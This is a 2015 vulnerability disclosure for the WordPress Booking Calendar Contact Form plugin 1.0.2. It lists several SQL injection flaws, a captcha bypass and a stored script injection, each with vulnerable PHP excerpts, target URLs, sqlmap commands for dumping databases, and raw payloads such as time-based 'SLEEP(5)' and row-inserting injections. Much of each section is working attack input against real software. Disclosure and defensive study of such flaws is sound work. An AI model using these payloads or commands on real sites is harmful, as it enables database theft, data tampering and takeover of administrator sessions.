@@ -1,0 +1,526 @@
+# Exploit Title: WordPress Booking Calendar Contact Form 1.0.2[Multiple
+vulnerabilities]
+# Date: 2015-05-01
+# Google Dork: Index of
+/wordpress/wp-content/plugins/booking-calendar-contact-form/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Software Link:
+http://wordpress.dwbooster.com/calendars/booking-calendar-contact-form
+# Vendor: CodePeople.net
+# Vebdor URI: http://codepeople.net
+# Version: 1.0.2
+# OWASP Top10: A1-Injection
+# Tested on: windows 7 ultimate + firefox + sqlmap 0.9.
+
+============================================
+* Authenticated SQL injection
+============================================
+
+========================
+Description
+========================
+
+
+In a site that has installed the plugin vulnerable and an attacker who has
+an account
+editor privileges can exploit the flaw SQL injection and possibly escalate
+their privileges.
+
+========================
+Vulnerability
+========================
+vulnerable function code is located in dex_bcf.php
+
+
+function dex_bccf_load_season_prices() {
+    global $wpdb;
+
+    if ( ! current_user_can('edit_pages') )
+    {
+        echo 'No enough privilegies to load this content.';
+        exit;
+    }
+
+    if (!defined('CP_BCCF_CALENDAR_ID'))
+        define ('CP_BCCF_CALENDAR_ID',$_GET["dex_item"]);
+
+    //.....vulnerable line
+
+    $codes = $wpdb->get_results( 'SELECT * FROM
+'.$wpdb->prefix.DEX_BCCF_SEASON_PRICES_TABLE_NAME_NO_PREFIX.' WHERE
+`cal_id`='.CP_BCCF_CALENDAR_ID);
+    $maxcosts = 0;
+
+...
+
+    if (count ($codes))
+    {
+        ... //Print results [bueno para seleccion mediante UNION]
+
+        foreach ($codes as $value)
+        {
+           echo '<tr>';
+           $price = explode(';',$value->price);
+           echo '<td>'.$price[0].'</td>';
+           for ($k=1; $k<=$maxcosts; $k++)
+               echo '<td>'.@$price[$k].'</td>';
+           echo '<td>'.substr($value->date_from,0,10).'</td>';
+           echo '<td>'.substr($value->date_to,0,10).'</td>';
+           echo '<td>[<a
+href="javascript:dex_delete_season_price('.$value->id.')">Delete</a>]</td>';
+           echo '</tr>';
+        }
+
+...
+    }
+
+======================
+Injection
+======================
+the following urls can be used to inject code.
+----------------------------------------------------------
+http://wp-host/wp-path/wp-admin/?action=dex_bccf_check_posted_data&dex_bccf=loadseasonprices&dex_item=1
+
+------------------------
+GET parameter vulnerable
+------------------------
+dex_item
+
+========================
+injection techniques:
+========================
+
+-> UNION BASED
+-> TIME BASED BLIND
+
+=======================
+POC
+=======================
+Obtaining all available databases from mysql server with sqlmap.
+---------------------------------------------------------------
+
+python sqlmap.py --url="
+http://wp-host/wp-path/wp-admin/?action=dex_bccf_check_posted_data&dex_bccf=loadseasonprices&dex_item=1
+"
+-p dex_item --level=5 --risk=3 --cookie="PUT_YOUR_WP_EDITOR_COOKIE_HERE"
+--dbms="mysql" --dbs
+
+====================================================
+
+
+=====================================================
+* Filter bypass & Authenticated SQL injection
+=====================================================
+
+===============
+Vulnerable code
+================
+
+function dex_bccf_calendar_delete($ret) {
+    global $wpdb;
+    $wpdb->query( "delete from ".TDE_BCCFCALENDAR_DATA_TABLE." where
+id=".esc_sql($_POST["id"]) );
+    return $ret;
+}
+
+======================
+Injection
+======================
+Following URLs are affected.
+----------------------------------------------------------
+http://wp-host/wp-path/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=delete
+
+------------------------
+POST parameter vulnerable
+------------------------
+id
+
+========================
+injection techniques:
+========================
+
+-> TIME BASED BLIND
+
+=======================
+POC
+=======================
+Obtaining all available databases from mysql server with sqlmap.
+---------------------------------------------------------------
+
+python sqlmap.py --url="
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=delete
+"
+--data="id=1" -p id --level=5 --risk=3
+--cookie="PUT_YOUR_WP_EDITOR_COOKIE_HERE" --dbms="mysql" --dbs --technique T
+
+
+
+====================================================
+* Authenticated SQL injection
+====================================================
+
+===============
+Vulnerable code
+================
+
+function dex_bccf_calendar_update($ret) {
+    global $wpdb;
+
+    dex_bccf_add_field_verify(TDE_BCCFCALENDAR_DATA_TABLE, "viadmin",
+"varchar(10) DEFAULT '0' NOT NULL");
+    dex_bccf_add_field_verify(TDE_BCCFCALENDAR_DATA_TABLE, "color",
+"varchar(10)");
+
+    $wpdb->query("update ".TDE_BCCFCALENDAR_DATA_TABLE." set
+title='".esc_sql($_POST["title"])."',description='".esc_sql($_POST["description"])."',color='".esc_sql($_POST["color"])."'
+where id=".esc_sql($_POST["id"]) );
+    return $ret;
+}
+
+======================
+Injection
+======================
+Following URLs are affected.
+----------------------------------------------------------
+http://wp-host/wp-path/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=edit
+
+------------------------
+POST parameter vulnerable
+------------------------
+id
+
+========================
+injection techniques:
+========================
+
+-> BLIND
+
+=======================
+POC
+=======================
+(modifing all rows with "i0akiN" value and sleeping 5 seconds)
+
+url
+-------
+http://wp-host/wp-path/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=edit
+----------
+post data
+----------
+id=0 or 1=1 AND SLEEP(5) -- -
+&tile=i0akiN&description=i0akiN&color=i0akiN
+
+
+=====================================================
+* Filter bypass & Authenticated SQL injection
+=====================================================
+
+===============
+Vulnerable code
+================
+
+function dex_bccf_calendar_add($ret) {
+    global $wpdb;
+
+    $calid = str_replace  (TDE_BCCFCAL_PREFIX, "",@$_GET["id"]);
+    ...
+
+    $wpdb->query("insert into
+".TDE_BCCFCALENDAR_DATA_TABLE."(viadmin,reservation_calendar_id,datatime_s,datatime_e,title,description,color)
+".
+                "
+values(1,".esc_sql($calid).",'".esc_sql($_POST["startdate"])."','".esc_sql($_POST["enddate"])."','".esc_sql($_POST["title"])."','"
+    .esc_sql($_POST["description"])."','".esc_sql($_POST["color"])."')");
+    ..
+
+}
+
+======================
+Injection
+======================
+Following URLs are affected.
+----------------------------------------------------------
+http://wp-host/wp-path/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=add&id=[SQLi]
+
+========================
+injection techniques:
+========================
+
+-> Insertion data
+
+=======================
+POC
+=======================
+
+Insert a row into wp_bccf_reservation_calendars_data table without use
+other post parameters
+
+http://wp-host/wp-path/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent&dex_bccf_calendar_load2=add&
+id=12,0x617373,0x617373,0x617373,0x617373,0x617373); -- -
+
+
+
+
+====================================================
+* Unauthenticated SQL injection
+====================================================
+=======================
+Description
+=======================
+
+An attacker without autorization can send modified requests to database and
+sensitive information
+that can use for escalate privilegies and more...
+
+======================
+Vulnerability
+======================
+vulnerable function code is located in dex_bcf.php
+
+
+function dex_bccf_caculate_price($startday, $enddate, $calendar,
+$default_price) {
+...
+
+//$calendar is not sanitized in sql query
+
+$codes = $wpdb->get_results( 'SELECT * FROM
+'.$wpdb->prefix.DEX_BCCF_SEASON_PRICES_TABLE_NAME_NO_PREFIX.' WHERE
+`cal_id`='.$calendar);
+    $mode =
+(dex_bccf_get_option('calendar_mode',DEX_BCCF_DEFAULT_CALENDAR_MODE) ==
+'false');
+    while (
+           (($enddate>$startday) && !$mode) ||
+           (($enddate>=$startday) && $mode)
+           )
+    {
+        $daily_price = $default_price;
+        $sprice = array();
+        foreach ($codes as $value)
+        {
+           $sfrom = strtotime($value->date_from);
+           $sto = strtotime($value->date_to);
+           if ($startday >= $sfrom && $startday <= $sto)
+           {
+               $sprice = explode (';', $value->price);
+               $daily_price = $sprice[0];
+           }
+        }
+        $season_prices[] = $sprice;
+        $price += $daily_price;
+        $startday = strtotime (date("Y-m-d", $startday)." +1 day");
+//60*60*24;
+        $days++;
+    }
+
+...
+}
+
+======================
+Injection
+======================
+Following URLs are affected.
+----------------------------------------------------------
+http://wp-host/wp-path/?action=dex_bccf_check_posted_data&dex_bccf=getcost
+
+------------------------
+post variable vulnerable
+------------------------
+dex_item=1
+
+========================
+injection techniques:
+========================
+
+-> UNION BASED <- yeaahh!!
+-> TIME BASED BLIND
+-> BOOLEAN BASED BLIND
+
+========================
+POC
+========================
+Obtaining all available databases from mysql server with sqlmap.
+
+python sqlmap.py --url="
+http://localhost/wordpress/?action=dex_bccf_check_posted_data&dex_bccf=getcost
+"
+--data="dex_item=1" -p dex_item --level=5 --risk=3 --dbms="mysql" --dbs
+--tecnique U
+
+===========================================================
+
+============================================================
+* Unauthenticated SQL injection 2
+============================================================
+
+========================
+Description
+========================
+
+The following function is also vulnerable to SQL injection because usually
+the variable
+CP_BCCF_CALENDAR_ID it equals the content of POST ['dex_item'] or GET
+['dex_item'] Besides this function is used in several places
+the code.
+
+========================
+Vulnerability
+========================
+Vulnerable function:
+
+function dex_bccf_get_option ($field, $default_value)
+{
+    global $wpdb, $dex_option_buffered_item, $dex_option_buffered_id;
+    if (!defined("CP_BCCF_CALENDAR_ID"))
+        return  $default_value;
+    if ($dex_option_buffered_id == CP_BCCF_CALENDAR_ID)
+        $value = @$dex_option_buffered_item->$field;
+    else
+    {
+//....vulnerable line
+
+       $myrows = $wpdb->get_results( "SELECT * FROM
+".DEX_BCCF_CONFIG_TABLE_NAME." WHERE id=".CP_BCCF_CALENDAR_ID );
+       $value = @$myrows[0]->$field;
+       $dex_option_buffered_item = $myrows[0];
+       $dex_option_buffered_id  = CP_BCCF_CALENDAR_ID;
+    }
+    if ($value == '' && $dex_option_buffered_item->calendar_language == '')
+        $value = $default_value;
+    return $value;
+}
+
+
+
+
+##########################################
+
+======================================
+    *  CAPTCHA BYPASS & ROW INSERTION
+======================================
+
+==============
+DESCRIPTION
+==============
+
+An attacker can manipulate some variables for bypass conditional staments.
+For example: insert unlimited rows into
+table (could use a program)
+
+=============
+ ... HOW?
+=============
+
+An attacker encodes parameter GET['hdcaptcha_dex_bccf_post'] to MD5
+encryption saving into value of
+"rand_code" cookie.
+
+==========
+POC
+==========
+
+REQUEST
+-----------
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data&hdcaptcha_dex_bccf_post=1&
+dex_item=1&
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data&
+hdcaptcha_dex_bccf_post=1&dex_item=1&hdcaptcha_dex_bccf_post=joaquin
+                                                                ^
+--------------                                                  |
+POST VARIABLES
+--------------
+hdcaptcha_dex_bccf_post=1
+
+-------
+COOKIES
+-------
+rand_code=a6beca7f198112079f836a4e67cf4821  <---joaquin MD5 encrypted
+
+===========================
+VULNERABLE FUNCTION CODE
+==========================
+
+
+function dex_bccf_check_posted_data(){
+  ....
+
+if (!isset($_GET['hdcaptcha_dex_bccf_post'])
+||$_GET['hdcaptcha_dex_bccf_post'] == '') $_GET['hdcaptcha_dex_bccf_post']
+= @$_POST['hdcaptcha_dex_bccf_post'];
+    if (
+           (dex_bccf_get_option('dexcv_enable_captcha',
+TDE_BCCFDEFAULT_dexcv_enable_captcha) != 'false') &&
+           ( (strtolower($_GET['hdcaptcha_dex_bccf_post']) !=
+strtolower($_SESSION['rand_code'])) ||
+             ($_SESSION['rand_code'] == '')
+           )
+           &&
+           ( (md5(strtolower($_GET['hdcaptcha_dex_bccf_post'])) !=
+($_COOKIE['rand_code'])) ||
+             ($_COOKIE['rand_code'] == '')
+           )
+       )
+    {
+        $_SESSION['rand_code'] = '';
+        echo 'captchafailed';
+        exit;
+    }
+
+// if this isn't the real post (it was the captcha verification) then echo
+ok and exit
+    if ( 'POST' != $_SERVER['REQUEST_METHOD'] || ! isset(
+$_POST['dex_bccf_post'] ) )
+{
+    echo 'ok';
+        exit;
+}
+   ...
+
+}
+
+
+###########################################
+
+=======================================
+   *  Persistent JS/HTML code injection
+=======================================
+
+========================
+Description:
+========================
+Un atacante sin autenticacion puede inyectar codigo malicioso que podria
+ejecutar el navegador
+de la victima(could be an administrator). Cuando la victima visite la
+pagina modificada, el atacante
+podria robar datos y/o controlar las acciones de la victima de forma remota.
+
+========================
+Vulnerability
+========================
+
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data
+
+POST-DATA
+
+dex_item=2
+dex_bccf_post_options=1
+email_confirmation_to_user=%3C%2Ftextarea%3E CUSTOM JS/HTML INYECTION
+ %3Ctextarea%3E
+email_notification_to_admin=%3C%2Ftextarea%3E CUSTOM JS/HTML INYECTION
+ %3Ctextarea%3E
+
+
+Parameters email_confirmation_to_user,email_notification_to_admin not
+filtered and is included in admin page
+
+====================
+VULNERABLE FUNCTION
+====================
+
+dex_bccf_save_options() located in dex_bccf.php
+
+save unfiltered post data
+
+
+
+#########################################
